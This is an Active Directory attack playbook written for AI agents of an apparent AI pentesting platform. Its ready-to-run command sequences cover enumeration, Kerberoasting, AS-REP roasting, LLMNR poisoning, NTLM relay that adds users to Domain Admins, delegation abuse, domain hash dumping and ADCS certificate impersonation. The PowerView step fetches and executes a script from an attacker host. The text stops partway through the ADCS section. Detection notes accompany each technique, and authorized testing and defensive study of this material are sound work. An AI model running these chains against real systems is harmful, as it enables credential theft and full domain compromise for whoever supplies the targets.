# ATHENA Active Directory Attack Playbook

**Version:** 1.0.0
**Created:** 2026-02-26
**Platform:** ATHENA AI Pentesting Platform (ZeroK Labs)
**Scope:** Full Active Directory attack lifecycle — enumeration through domain dominance
**Audience:** ATHENA AI agents executing authorized penetration tests

---

## Variable Reference

All procedures use placeholder variables. ATHENA agents substitute these before execution.

| Variable | Description | Example |
|---|---|---|
| `$TARGET_DC` | Primary domain controller IP | `10.0.0.5` |
| `$DOMAIN` | Domain FQDN | `corp.local` |
| `$DOMAIN_SHORT` | NetBIOS domain name | `CORP` |
| `$USERNAME` | Current compromised username | `jsmith` |
| `$PASSWORD` | Current compromised password | `Winter2025!` |
| `$HASH` | NT hash (no LM prefix) | `aad3b435...` |
| `$ATTACKER_IP` | Attacker/ATHENA machine IP | `10.0.0.99` |
| `$TARGET_USER` | Target account for attack | `svc_sql` |
| `$TARGET_HOST` | Target hostname or IP | `fileserver01` |
| `$TARGET_SPN` | Service principal name | `MSSQLSvc/db01.corp.local` |
| `$LOOT_DIR` | Local directory for output files | `/tmp/athena-loot` |
| `$DOMAIN_SID` | Domain Security Identifier | `S-1-5-21-...` |
| `$KRBTGT_HASH` | KRBTGT NT hash (post-DCSync) | `31d6cfe0...` |
| `$SERVICE_HASH` | Service account NT hash | `aad3b435...` |
| `$CERT_FILE` | Path to retrieved certificate | `/tmp/admin.pfx` |
| `$CA_NAME` | Certificate Authority name | `CORP-CA` |

---

## Attack Chain Overview

```
Phase 0: No Creds
  -> ASREPRoast (T1558.004)
  -> LLMNR/NBT-NS Poisoning (T1557.001)
  -> Anonymous LDAP bind

Phase 1: User Creds Acquired
  -> Domain Enumeration (BloodHound, ldapdomaindump)
  -> Kerberoasting (T1558.003)
  -> ACL path analysis

Phase 2: Service Account / Privileged User
  -> Delegation attacks (Unconstrained, Constrained, RBCD)
  -> ADCS abuse (ESC1-ESC8)
  -> Shadow Credentials
  -> ACL abuse via BloodHound paths

Phase 3: Domain Admin
  -> DCSync -> full hash dump
  -> Golden Ticket persistence
  -> AdminSDHolder persistence
  -> SID History injection

Phase 4: Persistence (Maintain Access)
  -> Silver Tickets (service-specific)
  -> GPO backdoors
  -> AdminSDHolder ACE
```

---

## Technique 01: Domain Enumeration

### Objective
Build a complete map of the Active Directory environment — users, groups, computers, trusts, SPNs, ACLs, and attack paths — before selecting an exploitation chain.

### Prerequisites
- Network access to DC (ports 389 LDAP, 445 SMB, 88 Kerberos)
- Valid domain credentials OR null session capability (anonymous LDAP bind for pre-auth enumeration)

### Tools
- `ldapdomaindump` (Python, anonymous-capable)
- `BloodHound.py` (requires credentials)
- `enum4linux-ng` (SMB/LDAP null session)
- `nmap --script=ldap-*`
- `CrackMapExec` (CME)
- `PowerView` (Windows, PowerShell)

### Procedure

**Step 1: Unauthenticated LDAP enumeration**
```bash
# Check for anonymous LDAP bind
ldapsearch -x -H ldap://$TARGET_DC -b "" -s base namingContexts

# Enumerate base domain info anonymously
ldapsearch -x -H ldap://$TARGET_DC -b "DC=${DOMAIN//./,DC=}" "(objectClass=domain)" \
  dn pwdHistoryLength lockoutThreshold minPwdLength maxPwdAge
```

**Step 2: SMB null session enumeration**
```bash
enum4linux-ng -A $TARGET_DC 2>/dev/null | tee $LOOT_DIR/enum4linux.txt

# CrackMapExec with null session
crackmapexec smb $TARGET_DC -u '' -p '' --shares
crackmapexec smb $TARGET_DC -u '' -p '' --users
crackmapexec smb $TARGET_DC -u '' -p '' --groups
```

**Step 3: ldapdomaindump (with credentials)**
```bash
mkdir -p $LOOT_DIR/ldapdomaindump
ldapdomaindump -u "$DOMAIN_SHORT\\$USERNAME" -p "$PASSWORD" \
  $TARGET_DC -o $LOOT_DIR/ldapdomaindump/

# Key output files:
# domain_users.json     - all users + attributes
# domain_computers.json - all computers
# domain_groups.json    - all groups + members
# domain_policy.json    - password/kerberos policy
# domain_trusts.json    - domain trusts
```

**Step 4: BloodHound collection (full)**
```bash
# From Linux attacker box
bloodhound-python -u $USERNAME -p "$PASSWORD" \
  -d $DOMAIN -ns $TARGET_DC -c All \
  --zip -o $LOOT_DIR/bloodhound/

# Alternative: target specific collection methods
bloodhound-python -u $USERNAME -p "$PASSWORD" \
  -d $DOMAIN -ns $TARGET_DC \
  -c DCOnly  # Fast: DC-only queries, no host scanning
```

**Step 5: Targeted LDAP queries for high-value objects**
```bash
# Find Kerberoastable accounts (SPN set, not krbtgt)
ldapsearch -x -H ldap://$TARGET_DC \
  -D "$USERNAME@$DOMAIN" -w "$PASSWORD" \
  -b "DC=${DOMAIN//./,DC=}" \
  "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer))(!(cn=krbtgt)))" \
  cn servicePrincipalName

# Find AS-REP Roastable accounts (preauth not required)
ldapsearch -x -H ldap://$TARGET_DC \
  -D "$USERNAME@$DOMAIN" -w "$PASSWORD" \
  -b "DC=${DOMAIN//./,DC=}" \
  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  cn userAccountControl

# Find unconstrained delegation hosts (not DCs)
ldapsearch -x -H ldap://$TARGET_DC \
  -D "$USERNAME@$DOMAIN" -w "$PASSWORD" \
  -b "DC=${DOMAIN//./,DC=}" \
  "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516)))" \
  cn dNSHostName

# Find constrained delegation accounts
ldapsearch -x -H ldap://$TARGET_DC \
  -D "$USERNAME@$DOMAIN" -w "$PASSWORD" \
  -b "DC=${DOMAIN//./,DC=}" \
  "(msDS-AllowedToDelegateTo=*)" \
  cn msDS-AllowedToDelegateTo

# Find LAPS-enabled computers (ms-Mcs-AdmPwd attribute exists)
ldapsearch -x -H ldap://$TARGET_DC \
  -D "$USERNAME@$DOMAIN" -w "$PASSWORD" \
  -b "DC=${DOMAIN//./,DC=}" \
  "(ms-Mcs-AdmPwd=*)" \
  cn ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
```

**Step 6: CrackMapExec broad enumeration**
```bash
# Share enumeration across subnet
crackmapexec smb 10.0.0.0/24 -u $USERNAME -p "$PASSWORD" \
  --shares 2>/dev/null | tee $LOOT_DIR/shares.txt

# Find local admin accounts across domain
crackmapexec smb 10.0.0.0/24 -u $USERNAME -p "$PASSWORD" \
  --local-auth 2>/dev/null | grep "[+]" | tee $LOOT_DIR/local_admin_reuse.txt

# Enumerate logged-on users (for targeting)
crackmapexec smb $TARGET_HOST -u $USERNAME -p "$PASSWORD" --loggedon-users
```

**Step 7: PowerView enumeration (from Windows)**
```powershell
# Import PowerView
IEX (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/PowerView.ps1')

# Get domain info
Get-Domain
Get-DomainController | Select-Object Name, IPAddress, OSVersion

# Find high-value targets
Get-DomainUser -SPN             # Kerberoastable
Get-DomainUser -PreauthNotRequired  # AS-REP Roastable
Get-DomainComputer -Unconstrained -Properties Name,DnsHostName  # Unconstrained delegation
Find-LocalAdminAccess           # Where current user is local admin

# ACL enumeration (critical for BloodHound path resolution)
Find-InterestingDomainAcl -ResolveGUIDs | Select-Object ObjectDN,ActiveDirectoryRights,IdentityReferenceName
```

### Detection
- Event ID 4661: Object handle requested on high-value objects (DCs, Domain Admins)
- Event ID 4768/4769: High-volume Kerberos requests (enumeration-style)
- LDAP query logging: abnormal query volume, unusual filter patterns
- Sysmon Event ID 1: `bloodhound.exe`, `sharphound.exe`, `ldapdomaindump` process creation
- Network: Port 389/636 connections from non-server workstations

### MITRE ATT&CK
- T1087.002 - Account Discovery: Domain Account
- T1069.002 - Permission Groups Discovery: Domain Groups
- T1018 - Remote System Discovery
- T1482 - Domain Trust Discovery
- T1201 - Password Policy Discovery

---

## Technique 02: Kerberoasting

### Objective
Request Kerberos service tickets (TGS) for user accounts with SPNs and crack them offline to recover plaintext passwords. No elevated privileges required. Works as any authenticated domain user.

### Prerequisites
- Valid domain credentials (any user)
- Network access to DC on port 88 (Kerberos) and 389 (LDAP)
- Hashcat or John with wordlist + rules on offline cracking station

### Tools
- `GetUserSPNs.py` (Impacket)
- `Rubeus.exe` (Windows)
- `hashcat` (offline cracking)
- `john` (alternative)

### Procedure

**Step 1: Enumerate Kerberoastable accounts**
```bash
# List targets before requesting tickets
GetUserSPNs.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -request-user $TARGET_USER   # Single account

# List all accounts with SPNs (no ticket request yet)
GetUserSPNs.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC
```

**Step 2: Request TGS tickets (all accounts)**
```bash
# Request all TGS hashes for offline cracking
GetUserSPNs.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -request \
  -outputfile $LOOT_DIR/kerberoast_hashes.txt

# Request specific account
GetUserSPNs.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -request-user $TARGET_USER \
  -outputfile $LOOT_DIR/kerberoast_$TARGET_USER.txt
```

**Step 3: Targeted Kerberoasting with hash selection**
```bash
# Request RC4 encrypted tickets (easier to crack than AES)
# Note: If account only supports AES, you will get AES ticket
GetUserSPNs.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -request \
  -format hashcat   # Ensure hashcat format

# From Windows with Rubeus
.\Rubeus.exe kerberoast /outfile:$LOOT_DIR\hashes.txt /format:hashcat

# Targeted single account (stealthier)
.\Rubeus.exe kerberoast /user:$TARGET_USER /outfile:$LOOT_DIR\$TARGET_USER.txt
```

**Step 4: Crack hashes offline**
```bash
# Hashcat against common wordlist + rules
hashcat -m 13100 $LOOT_DIR/kerberoast_hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force

# More aggressive rule set
hashcat -m 13100 $LOOT_DIR/kerberoast_hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule \
  --force

# AES-256 Kerberoast (mode 19700)
hashcat -m 19700 $LOOT_DIR/kerberoast_hashes.txt \
  /usr/share/wordlists/rockyou.txt

# Show cracked results
hashcat -m 13100 $LOOT_DIR/kerberoast_hashes.txt --show
```

**Step 5: Validate cracked credentials**
```bash
crackmapexec smb $TARGET_DC -u $TARGET_USER -p "$CRACKED_PASSWORD" -d $DOMAIN
```

### Detection
- Event ID 4769: Kerberos service ticket request with encryption type 0x17 (RC4) from user accounts
- Event ID 4769 volume: Multiple TGS requests for different services in short window
- Honeypot SPN: Create a fake SPN account that is never legitimately used; any 4769 for it is malicious
- SIEM rule: `EventID=4769 AND TicketEncryptionType=0x17 AND NOT ServiceName LIKE "krbtgt"`

### MITRE ATT&CK
- T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting

---

## Technique 03: AS-REP Roasting

### Objective
Extract AS-REP responses from accounts configured with "Do not require Kerberos preauthentication" and crack the encrypted portion offline. Does not require any credentials for discovery.

### Prerequisites
- Network access to DC port 88 (Kerberos)
- Username list (even without credentials)
- For authenticated enumeration: any valid domain credentials

### Tools
- `GetNPUsers.py` (Impacket)
- `Rubeus.exe` (Windows)
- `hashcat` or `john`

### Procedure

**Step 1: Enumerate vulnerable accounts (with creds)**
```bash
# Find accounts with pre-auth disabled (with creds)
GetNPUsers.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -request \
  -format hashcat \
  -outputfile $LOOT_DIR/asrep_hashes.txt
```

**Step 2: AS-REP Roast without credentials (user list spray)**
```bash
# Build username list from OSINT/enumeration first
# Then spray without any creds
GetNPUsers.py $DOMAIN/ \
  -usersfile $LOOT_DIR/usernames.txt \
  -dc-ip $TARGET_DC \
  -no-pass \
  -format hashcat \
  -outputfile $LOOT_DIR/asrep_hashes_nocreds.txt

# Users that return AS-REP are vulnerable; users with pre-auth return KRB_ERROR
```

**Step 3: From Windows with Rubeus**
```powershell
# All accounts with pre-auth disabled
.\Rubeus.exe asreproast /format:hashcat /outfile:$LOOT_DIR\asrep.txt

# Single target
.\Rubeus.exe asreproast /user:$TARGET_USER /format:hashcat
```

**Step 4: Crack AS-REP hashes**
```bash
# Hashcat mode 18200 for AS-REP
hashcat -m 18200 $LOOT_DIR/asrep_hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force

hashcat -m 18200 $LOOT_DIR/asrep_hashes.txt --show
```

### Detection
- Event ID 4768: AS-REQ with no preauthentication (PA-DATA type absent or PA-DATA-ENC-TIMESTAMP missing)
- Event ID 4768 with `PreAuthType = 0` — direct indicator
- Monitor for accounts with `userAccountControl` bit 4194304 set (DONT_REQ_PREAUTH)
- Alert: Any account sending AS-REQ without PA-ENC-TIMESTAMP from non-enrolled host

### MITRE ATT&CK
- T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting

---

## Technique 04: LLMNR / NBT-NS Poisoning

### Objective
Intercept name resolution broadcasts on the local network segment to capture Net-NTLMv2 hashes from Windows hosts attempting to resolve hostnames. Works with zero credentials.

### Prerequisites
- Network access on same Layer 2 segment as target hosts
- LLMNR not disabled by GPO (still default in most environments)
- Root/sudo on attacker machine

### Tools
- `Responder` (primary - handles LLMNR, NBT-NS, MDNS, WPAD)
- `ntlmrelayx.py` (to relay instead of just capture)

### Procedure

**Step 1: Configure Responder for capture mode**
```bash
# Edit Responder config first
cat /etc/responder/Responder.conf

# Capture hashes only (no relay)
responder -I eth0 -wrf

# Flags:
# -I eth0   - interface
# -w        - WPAD rogue server
# -r        - NBT-NS answers for workstation requests
# -f        - Fingerprint (identify OS of hosts)
```

**Step 2: Wait for LLMNR/NBT-NS queries**
```bash
# Responder captures automatically. Watch output:
# [SMB] NTLMv2-SSP Client: 10.0.0.45
# [SMB] NTLMv2-SSP Username: CORP\jsmith
# [SMB] NTLMv2-SSP Hash: jsmith::CORP:...

# Hashes saved automatically to:
ls /var/log/responder/Responder-Session.log
ls /var/log/responder/*.txt
```

**Step 3: Speed up capture with WPAD abuse**
```bash
# WPAD forces browsers to look up proxy config via LLMNR
# Responder with WPAD + forced Basic Auth (gets cleartext)
responder -I eth0 -wrf --lm

# -lm forces LM hash generation (weaker, cracks faster)
# --disable-ess disables Extended Session Security for easier cracking
```

**Step 4: Crack captured NTLMv2 hashes**
```bash
# Hashes are in hashcat format 5600
hashcat -m 5600 /var/log/responder/SMB-NTLMv2-SSP-10.0.0.45.txt \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force

hashcat -m 5600 /var/log/responder/SMB-NTLMv2-SSP-10.0.0.45.txt --show
```

**Step 5: NTLMv1 downgrade (if environment allows)**
```bash
# Check if environment sends NTLMv1 (LmCompatibilityLevel < 3)
# Responder downgrade attempt
responder -I eth0 --lm --disable-ess

# NTLMv1 hashes (mode 5500) are much faster to crack
# Can also be sent to crack.sh for NTLM extraction
hashcat -m 5500 ntlmv1_hash.txt /usr/share/wordlists/rockyou.txt
```

### Detection
- Windows Event ID 4625 (Failed Logon) with logon type 3 from unusual hosts
- Network: LLMNR queries (UDP 5355) should be rare in managed environments
- NBT-NS traffic (UDP 137) from non-DC hosts responding to name queries is suspicious
- WPAD requests to non-proxy hosts
- Microsoft Defender for Identity: "LDAP Reconnaissance" and "SMB Relay" alerts

### MITRE ATT&CK
- T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

---

## Technique 05: NTLM Relay to LDAP

### Objective
Relay captured NTLM authentication to LDAP/LDAPS on a domain controller to abuse AD ACLs — adding users to groups, granting DCSync rights, or writing RBCD attributes — without cracking any hashes.

### Prerequisites
- LDAP Signing: Not enforced (check with crackmapexec ldap --module ldap-signing)
- SMB Signing: Does not matter (we target LDAP, not SMB)
- Position to intercept NTLM authentication (LLMNR/NBT-NS or DNS manipulation)
- Impacket installed

### Tools
- `Responder` (capture/poison - run with SMB=Off, HTTP=Off for relay mode)
- `ntlmrelayx.py` (relay engine)

### Procedure

**Step 1: Check LDAP signing status**
```bash
crackmapexec ldap $TARGET_DC -u $USERNAME -p "$PASSWORD" \
  -M ldap-signing
# "LDAP Signing NOT Enforced" = vulnerable
```

**Step 2: Disable Responder's conflicting servers**
```bash
# Edit /etc/responder/Responder.conf:
# SMB = Off
# HTTP = Off
# (We need these ports free for ntlmrelayx)

# Start Responder (poisoning only, no capture servers)
responder -I eth0 -wrf --no-http-server --no-smb-server
```

**Step 3a: Relay to LDAP - Add user to Domain Admins**
```bash
ntlmrelayx.py \
  -t ldap://$TARGET_DC \
  --escalate-user $USERNAME \
  -smb2support

# When a relay succeeds, ntlmrelayx adds $USERNAME to Domain Admins
# Watch output: "[*] Privilege escalation successful!"
```

**Step 3b: Relay to LDAP - Grant DCSync rights**
```bash
ntlmrelayx.py \
  -t ldap://$TARGET_DC \
  --escalate-user $USERNAME \
  -smb2support \
  --dump-laps  # Also dump LAPS passwords if accessible
```

**Step 3c: Relay to LDAP - Interactive LDAP shell**
```bash
ntlmrelayx.py \
  -t ldap://$TARGET_DC \
  -i \          # Interactive mode
  -smb2support

# When relay succeeds, interactive LDAP shell opens on localhost port 11389
nc 127.0.0.1 11389
# Commands:
# add_user_to_group "jsmith" "Domain Admins"
# modify_dacl TARGET_DN privilege
```

**Step 4: Relay to LDAPS (with TLS)**
```bash
ntlmrelayx.py \
  -t ldaps://$TARGET_DC \
  --escalate-user $USERNAME \
  -smb2support
```

**Step 5: Relay to LDAP - RBCD attack**
```bash
# First create a computer account we control
addcomputer.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -computer-name ATHENA_RELAY$ \
  -computer-pass "Relay@2025!" \
  -dc-ip $TARGET_DC

# Relay with RBCD delegation write
ntlmrelayx.py \
  -t ldap://$TARGET_DC \
  --delegate-access \
  --escalate-user ATHENA_RELAY$ \
  -smb2support
```

**Step 6: Coerce authentication for relay (DFSCoerce)**
```bash
# Instead of waiting for natural LLMNR, actively coerce
# Requires valid domain credentials
python3 dfscoerce.py -u $USERNAME -d $DOMAIN -p "$PASSWORD" \
  $ATTACKER_IP $TARGET_HOST

# PetitPotam alternative
python3 PetitPotam.py \
  -u $USERNAME -p "$PASSWORD" -d $DOMAIN \
  $ATTACKER_IP $TARGET_DC
```

### Detection
- Event ID 4624: Successful logon from unexpected source IP (the DC logging the relay)
- Event ID 4662: Object operation on AD with unusual account (the relayed account modifying ACLs)
- Event ID 4728/4756: Member added to security-enabled group
- Microsoft Defender for Identity: "NTLM Relay" and "Suspicious LDAP query" alerts
- SIEM: New DCSync-capable account not matching IT change tickets

### MITRE ATT&CK
- T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay
- T1098 - Account Manipulation

---

## Technique 06: Unconstrained Delegation

### Objective
Abuse hosts configured for Unconstrained Delegation (TrustedForDelegation = True) to capture Kerberos TGTs from any user or computer that authenticates to the host, including Domain Controllers. Combined with authentication coercion, achieves Domain Admin from a single compromised server.

### Prerequisites
- Code execution on a host configured for Unconstrained Delegation (non-DC)
- Ability to coerce DC authentication: PetitPotam, DFSCoerce, PrinterBug, or wait for natural auth
- Impacket suite (krbrelayx, findDelegation)

### Tools
- `findDelegation.py` (enumerate targets)
- `krbrelayx` (relay tool)
- `PetitPotam.py` / `DFSCoerce.py` (coerce DC auth)
- `secretsdump.py` (post-exploitation)

### Procedure

**Step 1: Find unconstrained delegation hosts**
```bash
findDelegation.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC | grep -i "unconstrained"

# PowerView alternative
Get-DomainComputer -Unconstrained -Properties Name,DnsHostName | \
  Where-Object { $_.Name -ne (Get-DomainController).Name }
```

**Step 2: Verify compromise of unconstrained delegation host**
```bash
# Confirm code execution on the unconstrained host
crackmapexec smb $TARGET_HOST -u $USERNAME -p "$PASSWORD" -x "whoami /all"
# Must show SeEnableDelegationPrivilege or be running as SYSTEM
```

**Step 3: Set up krbrelayx listener on attacker (or on compromised host)**
```bash
# Get the host's credentials (Kerberos keys)
# Option A: If we have password for the account
getST.py $DOMAIN/$TARGET_HOST\$:"$HOST_PASSWORD" \
  -spn host/$TARGET_HOST.$DOMAIN \
  -impersonate administrator \
  -dc-ip $TARGET_DC

# Option B: Use krbrelayx with the machine account hash
krbrelayx.py \
  -aesKey $AES_KEY \   # Or use -hashes LMHASH:NTHASH
  -t $TARGET_DC        # Will capture TGT for DC machine account
```

**Step 4: Add DNS record (for coercion path)**
```bash
# Add attacker IP as DNS record in AD DNS (any user can do this by default)
dnstool.py \
  -u "$DOMAIN\\$USERNAME" -p "$PASSWORD" \
  -r attacker.$DOMAIN \
  -a add -t A -d $ATTACKER_IP \
  $TARGET_DC
```

**Step 5: Coerce DC authentication to unconstrained host**
```bash
# PetitPotam - coerce DC to authenticate to attacker IP
python3 PetitPotam.py \
  -u $USERNAME -p "$PASSWORD" -d $DOMAIN \
  $ATTACKER_IP $TARGET_DC

# DFSCoerce - alternative coercion
python3 dfscoerce.py \
  -u $USERNAME -d $DOMAIN -p "$PASSWORD" \
  $ATTACKER_IP $TARGET_DC

# PrinterBug / SpoolSample
python3 printerbug.py \
  $DOMAIN/$USERNAME:"$PASSWORD" \
  $TARGET_DC $ATTACKER_IP
```

**Step 6: Import captured TGT and DCSync**
```bash
# krbrelayx saves captured TGT as .ccache
ls /tmp/*.ccache

# Export for use
export KRB5CCNAME=/tmp/DC01\$@CORP.LOCAL.ccache

# DCSync using captured TGT
secretsdump.py \
  -k -no-pass \
  -just-dc-user administrator \
  $DOMAIN/DC01\$@$TARGET_DC

# Full domain dump
secretsdump.py \
  -k -no-pass \
  $DOMAIN/DC01\$@$TARGET_DC
```

### Detection
- Event ID 4769: Multiple TGS requests, especially for DC machine accounts
- Monitor: Computer accounts with `userAccountControl` bit 524288 (TrustedForDelegation) excluding DCs
- Event ID 4738: User account change (delegation flag modified)
- Alert on: Machine account TGT usage from unusual IP addresses
- DFSN-Server Event ID 515 (DFSCoerce coercion attempt)
- PrintSpooler: Event ID 316 from unexpected hosts

### MITRE ATT&CK
- T1134.001 - Access Token Manipulation: Token Impersonation/Theft
- T1558 - Steal or Forge Kerberos Tickets
- T1187 - Forced Authentication

---

## Technique 07: Constrained Delegation

### Objective
Abuse accounts configured for constrained delegation to impersonate any domain user (including Domain Admins) to a specific target service, using S4U2Self and S4U2Proxy Kerberos extensions.

### Prerequisites
- Credentials or NTLM hash for an account with constrained delegation configured
- Knowledge of the target SPN the account is allowed to delegate to
- Impacket suite

### Tools
- `findDelegation.py` (enumerate constrained delegation accounts)
- `getST.py` (request service tickets via S4U)
- `smbexec.py`, `psexec.py`, `wmiexec.py` (use the ticket for execution)

### Procedure

**Step 1: Enumerate constrained delegation accounts**
```bash
findDelegation.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC

# Look for "Constrained" in output
# Note the account and its msDS-AllowedToDelegateTo values

# LDAP query directly
ldapsearch -x -H ldap://$TARGET_DC \
  -D "$USERNAME@$DOMAIN" -w "$PASSWORD" \
  -b "DC=${DOMAIN//./,DC=}" \
  "(msDS-AllowedToDelegateTo=*)" \
  cn msDS-AllowedToDelegateTo userAccountControl
```

**Step 2: S4U2Self - Get TGS on behalf of target user**
```bash
# If the account has "Protocol Transition" (TrustedToAuthForDelegation bit)
# we can impersonate any user
getST.py $DOMAIN/$DELEGATION_ACCOUNT:"$DELEG_PASSWORD" \
  -spn $TARGET_SPN \
  -impersonate administrator \
  -dc-ip $TARGET_DC

# With hash instead of password
getST.py $DOMAIN/$DELEGATION_ACCOUNT \
  -hashes :$HASH \
  -spn $TARGET_SPN \
  -impersonate administrator \
  -dc-ip $TARGET_DC
```

**Step 3: Use the ticket for access**
```bash
# Export the ticket
export KRB5CCNAME=$LOOT_DIR/administrator@$TARGET_SPN.ccache

# PSExec with ticket
psexec.py $DOMAIN/administrator@$TARGET_HOST -k -no-pass

# WMI exec
wmiexec.py $DOMAIN/administrator@$TARGET_HOST -k -no-pass

# SMB exec
smbexec.py $DOMAIN/administrator@$TARGET_HOST -k -no-pass
```

**Step 4: Alternative - With AES keys (opsec-safe)**
```bash
# Request with AES keys instead of RC4 (avoids RC4 downgrade detection)
getST.py $DOMAIN/$DELEGATION_ACCOUNT \
  -aesKey $AES256_KEY \
  -spn $TARGET_SPN \
  -impersonate administrator \
  -dc-ip $TARGET_DC -k
```

### Detection
- Event ID 4769: S4U2Self requests have unusual structure (service requesting on behalf of user)
- Monitor: Accounts with `userAccountControl` bit 16777216 (TrustedToAuthForDelegation)
- Alert: Multiple service tickets requested for same account from one source in short window
- AD Audit: Accounts with `msDS-AllowedToDelegateTo` should be on approved list

### MITRE ATT&CK
- T1558 - Steal or Forge Kerberos Tickets
- T1134.001 - Token Impersonation/Theft

---

## Technique 08: Resource-Based Constrained Delegation (RBCD)

### Objective
Write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on a target computer object to grant a controlled computer account the ability to impersonate any domain user to that machine, enabling code execution as SYSTEM or any user.

### Prerequisites
- Write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on target computer (via GenericWrite, WriteProperty, or GenericAll ACE)
- Control of a computer account with an SPN (or ability to create one)
- Impacket suite

### Tools
- `rbcd.py` (or PowerView Set-DomainObject)
- `addcomputer.py` (create controlled computer account)
- `getST.py` (S4U attack chain)
- `psexec.py` / `wmiexec.py`

### Procedure

**Step 1: Create a computer account we control (if needed)**
```bash
# Any domain user can add up to 10 computer accounts by default (ms-DS-MachineAccountQuota)
addcomputer.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -computer-name ATHENA01$ \
  -computer-pass "Athena@2025!" \
  -dc-ip $TARGET_DC

# Verify creation
crackmapexec smb $TARGET_DC -u ATHENA01$ -p "Athena@2025!" -d $DOMAIN
```

**Step 2: Write RBCD attribute on target**
```bash
# Using rbcd.py
rbcd.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -action write \
  -delegate-to $TARGET_HOST$ \
  -delegate-from ATHENA01$ \
  -dc-ip $TARGET_DC

# PowerView alternative (from Windows)
$ComputerSid = Get-DomainComputer -Identity ATHENA01 -Properties objectsid | Select-Object -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $TARGET_HOST | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

**Step 3: Verify RBCD attribute was written**
```bash
rbcd.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -action read \
  -delegate-to $TARGET_HOST$ \
  -dc-ip $TARGET_DC
```

**Step 4: S4U attack - Get service ticket impersonating Administrator**
```bash
getST.py $DOMAIN/ATHENA01$:"Athena@2025!" \
  -spn cifs/$TARGET_HOST.$DOMAIN \
  -impersonate administrator \
  -dc-ip $TARGET_DC
```

**Step 5: Use ticket for code execution**
```bash
export KRB5CCNAME=$LOOT_DIR/administrator@cifs_$TARGET_HOST.$DOMAIN@$DOMAIN.ccache

# Shell access
psexec.py $DOMAIN/administrator@$TARGET_HOST.$DOMAIN -k -no-pass

# File access
smbclient.py $DOMAIN/administrator@$TARGET_HOST.$DOMAIN -k -no-pass

# WMI
wmiexec.py $DOMAIN/administrator@$TARGET_HOST.$DOMAIN -k -no-pass
```

**Step 6: Cleanup RBCD attribute after use**
```bash
rbcd.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -action flush \
  -delegate-to $TARGET_HOST$ \
  -dc-ip $TARGET_DC
```

### Detection
- Event ID 4742: Computer account changed (msDS-AllowedToActOnBehalfOfOtherIdentity modified)
- Event ID 4741: New computer account created (from addcomputer.py step)
- LDAP audit: Write operations to computer object `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
- Alert: Machine account quota consumption (track ms-DS-MachineAccountQuota changes)

### MITRE ATT&CK
- T1558 - Steal or Forge Kerberos Tickets
- T1098 - Account Manipulation

---

## Technique 09: ADCS Abuse (ESC1-ESC8)

### Objective
Exploit Active Directory Certificate Services misconfigurations to request certificates that enable authentication as any domain user, including Domain Admins. ADCS is present in most enterprise environments and frequently misconfigured.

### Prerequisites
- Valid domain credentials
- ADCS role deployed in the environment
- Certipy installed

### Tools
- `certipy` (primary - find, req, auth, shadow, relay)
- `Certify.exe` (Windows equivalent)
- `openssl` (certificate manipulation)

### Procedure

**Step 0: Discover ADCS environment**
```bash
# Find certificate authorities and templates
certipy find \
  -u $USERNAME@$DOMAIN \
  -p "$PASSWORD" \
  -dc-ip $TARGET_DC \
  -stdout \
  -vulnerable        # Show only vulnerable templates

# Full output to JSON for analysis
certipy find \
  -u $USERNAME@$DOMAIN \
  -p "$PASSWORD" \
  -dc-ip $TARGET_DC \
  -output $LOOT_DIR/certipy_find
```

**ESC1: Client Authentication Template with Enrollee Supplies Subject**

This is the most common critical ADCS misconfiguration. The template allows the enrollee to specify the Subject Alternative Name (SAN), enabling impersonation of any user.

```bash
# Request certificate specifying admin as SAN
certipy req \
  -u $USERNAME@$DOMAIN \
  -p "$PASSWORD" \
  -ca "$CA_NAME" \
  -template "VulnerableTemplate" \
  -upn administrator@$DOMAIN \
  -dc-ip $TARGET_DC \
  -out $LOOT_DIR/admin_esc1.pfx

# Authenticate with the certificate to get TGT
certipy auth \
  -pfx $LOOT_DIR/admin_esc1.pfx \
  -username administrator \
  -domain $DOMAIN \
  -dc-ip $TARGET_DC

# Outputs: TGT (.ccache) + NT hash of administrator
export KRB5CCNAME=$LOOT_DIR/administrator.ccache
```

